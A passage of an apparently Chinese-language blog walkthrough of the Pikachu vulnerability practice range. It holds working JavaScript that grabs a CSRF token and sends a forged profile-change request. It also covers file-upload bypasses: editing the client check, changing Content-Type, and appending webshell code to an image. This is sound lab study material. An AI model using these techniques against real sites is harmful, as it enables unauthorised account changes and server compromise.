class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置请求方式和请求地址</span></span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://www.pikachu.com/vul/csrf/csrftoken/token_get_edit.php&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置响应类型为文本</span></span><br><span class="line">xhr.<span class="property">responseType</span> = <span class="string">&quot;text&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//发送请求</span></span><br><span class="line">xhr.<span class="title function_">send</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听xhr对象的load事件</span></span><br><span class="line">xhr.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">//判断响应状态码是否为200</span></span><br><span class="line">  <span class="keyword">if</span> (xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="comment">//获取响应文本内容</span></span><br><span class="line">    <span class="keyword">var</span> responseText = xhr.<span class="property">responseText</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//使用正则表达式提取Token值</span></span><br><span class="line">    <span class="keyword">var</span> tokenPattern = <span class="regexp">/name=&quot;token&quot; value=&quot;(\w+)&quot;/</span>;</span><br><span class="line">    <span class="keyword">var</span> matchResult = responseText.<span class="title function_">match</span>(tokenPattern);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断是否匹配成功</span></span><br><span class="line">    <span class="keyword">if</span> (matchResult !== <span class="literal">null</span> &amp;&amp; matchResult.<span class="property">length</span> &gt; <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">//获取Token值</span></span><br><span class="line">      <span class="keyword">var</span> token = matchResult[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">      <span class="comment">//打印Token值</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Token值为：&quot;</span> + token);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;未找到Token值&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;请求失败，状态码为：&quot;</span> + xhr.<span class="property">status</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230327164912206.png" alt="image-20230327164912206"></p>
<p>接下来就需要将这个获取的Token值带入到CSRF的数据包中。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建XMLHttpRequest对象</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置请求方式和请求地址</span></span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://www.pikachu.com/vul/csrf/csrftoken/token_get_edit.php&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置响应类型为文本</span></span><br><span class="line">xhr.<span class="property">responseType</span> = <span class="string">&quot;text&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//发送请求</span></span><br><span class="line">xhr.<span class="title function_">send</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听xhr对象的load事件</span></span><br><span class="line">xhr.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//判断响应状态码是否为200</span></span><br><span class="line">    <span class="keyword">if</span> (xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="comment">//获取响应文本内容</span></span><br><span class="line">        <span class="keyword">var</span> responseText = xhr.<span class="property">responseText</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用正则表达式提取Token值</span></span><br><span class="line">        <span class="keyword">var</span> tokenPattern = <span class="regexp">/name=&quot;token&quot; value=&quot;(\w+)&quot;/</span>;</span><br><span class="line">        <span class="keyword">var</span> matchResult = responseText.<span class="title function_">match</span>(tokenPattern);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断是否匹配成功</span></span><br><span class="line">        <span class="keyword">if</span> (matchResult !== <span class="literal">null</span> &amp;&amp; matchResult.<span class="property">length</span> &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">//获取Token值</span></span><br><span class="line">            token = matchResult[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            <span class="comment">//打印Token值</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Token值为：&quot;</span> + token);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 定义请求的URL地址</span></span><br><span class="line">            <span class="keyword">const</span> url = <span class="string">&quot;http://www.pikachu.com/vul/csrf/csrftoken/token_get_edit.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 定义请求参数</span></span><br><span class="line">            <span class="keyword">const</span> params = &#123; <span class="attr">sex</span>: <span class="string">&quot;boy&quot;</span>, <span class="attr">phonenum</span>: <span class="string">&quot;123456&quot;</span>, <span class="attr">add</span>: <span class="string">&quot;123456&quot;</span>, <span class="attr">email</span>: <span class="string">&quot;123456&quot;</span>, <span class="attr">token</span>: token, <span class="attr">submit</span>: <span class="string">&quot;submit&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 拼接请求URL和参数</span></span><br><span class="line">            <span class="keyword">let</span> requestUrl = url + <span class="string">&quot;?&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">const</span> [key, value] <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">entries</span>(params)) &#123;</span><br><span class="line">                <span class="comment">// 使用encodeURIComponent()函数对参数值进行编码，防止出现特殊字符</span></span><br><span class="line">                requestUrl += <span class="string">`<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(value)&#125;</span>&amp;`</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 去掉最后一个“&amp;”符号</span></span><br><span class="line">            requestUrl = requestUrl.<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建XMLHttpRequest对象</span></span><br><span class="line">            <span class="keyword">const</span> xhrx = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">            <span class="comment">// 使用GET方法发送请求</span></span><br><span class="line">            xhrx.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, requestUrl, <span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 设置请求头</span></span><br><span class="line">            xhrx.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">            <span class="comment">// 监听状态变化</span></span><br><span class="line">            xhrx.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="comment">// 当请求完成并且响应状态为200时，打印响应内容</span></span><br><span class="line">                <span class="keyword">if</span> (xhrx.<span class="property">readyState</span> === <span class="number">4</span> &amp;&amp; xhrx.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;发送成功&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">// 发送请求</span></span><br><span class="line">            xhrx.<span class="title function_">send</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;未找到Token值&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;请求失败，状态码为：&quot;</span> + xhr.<span class="property">status</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>修改成功！</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230327173837121.png" alt="image-20230327173837121"></p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h3><p>找到了客户端的检查代码</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230319201430101.png" alt="image-20230319201430101"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230319203159186.png" alt="image-20230319203159186"></p>
<p>将前端的代码修改即可</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230319203307671.png" alt="image-20230319203307671"></p>
<h3 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h3><p>修改<code>Content-Type</code>。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230319203558781.png" alt="image-20230319203558781"></p>
<h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h3><p><code>getimagesize() </code>函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p>
<p>解决方法是以二进制的形式向图片的尾部插入木马代码。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230320152228372.png" alt="image-20230320152228372"></p>
<p>由于网站访问png文件是解析不了php代码的，所以需要用文件包含执行一下</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/pikachu/image-20230320152407223.png" alt="image-20230320152407223"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/categories/">categories</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
          <li><a href="/links/">links</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://gitee.com/rmrfsad/rmrfsad">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-server"><span class="toc-number">1.1.</span> <span class="toc-text">验证码绕过(on server)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-client"><span class="toc-number">1.2.</span> <span class="toc-text">验证码绕过(on client)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#token%E9%98%B2%E7%88%86%E7%A0%B4%EF%BC%9F"><span class="toc-number">1.3.</span> <span class="toc-text">token防爆破？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">2.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss-get"><span class="toc-number">2.1.</span> <span class="toc-text">反射型xss(get)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-number">2.2.</span> <span class="toc-text">存储型xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8Bxss"><span class="toc-number">2.3.</span> <span class="toc-text">DOM型xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E7%9B%B2%E6%89%93"><span class="toc-number">2.4.</span> <span class="toc-text">xss盲打</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E4%B9%8B%E8%BF%87%E6%BB%A4"><span class="toc-number">2.5.</span> <span class="toc-text">xss之过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E4%B9%8Bhtmlspecialchars"><span class="toc-number">2.6.</span> <span class="toc-text">xss之htmlspecialchars</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E4%B9%8Bhref%E8%BE%93%E5%87%BA"><span class="toc-number">2.7.</span> <span class="toc-text">xss之href输出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E4%B9%8Bjs%E8%BE%93%E5%87%BA"><span class="toc-number">2.8.</span> <span class="toc-text">xss之js输出</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-number">3.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-get"><span class="toc-number">3.1.</span> <span class="toc-text">CSRF(get)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-post"><span class="toc-number">3.2.</span> <span class="toc-text">CSRF(post)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-Token"><span class="toc-number">3.3.</span> <span class="toc-text">CSRF Token</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">4.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#client-check"><span class="toc-number">4.1.</span> <span class="toc-text">client check</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MIME-type"><span class="toc-number">4.2.</span> <span class="toc-text">MIME type</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getimagesize"><span class="toc-number">4.3.</span> <span class="toc-text">getimagesize</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/03/27/Web/pikachu/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/03/27/Web/pikachu/&text=Pikachu 靶场学习"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/03/27/Web/pikachu/&title=Pikachu 靶场学习"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/03/27/Web/pikachu/&is_video=false&description=Pikachu 靶场学习"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Pikachu 靶场学习&body=Check out this article: http://example.com/2023/03/27/Web/pikachu/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/03/27/Web/pikachu/&title=Pikachu 靶场学习"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/03/27/Web/pikachu/&title=Pikachu 靶场学习"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/03/27/Web/pikachu/&title=Pikachu 靶场学习"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/03/27/Web/pikachu/&title=Pikachu 靶场学习"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/03/27/Web/pikachu/&name=Pikachu 靶场学习&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/03/27/Web/pikachu/&t=Pikachu 靶场学习"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021-2024
    Pursue
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">categories</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://gitee.com/rmrfsad/rmrfsad">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
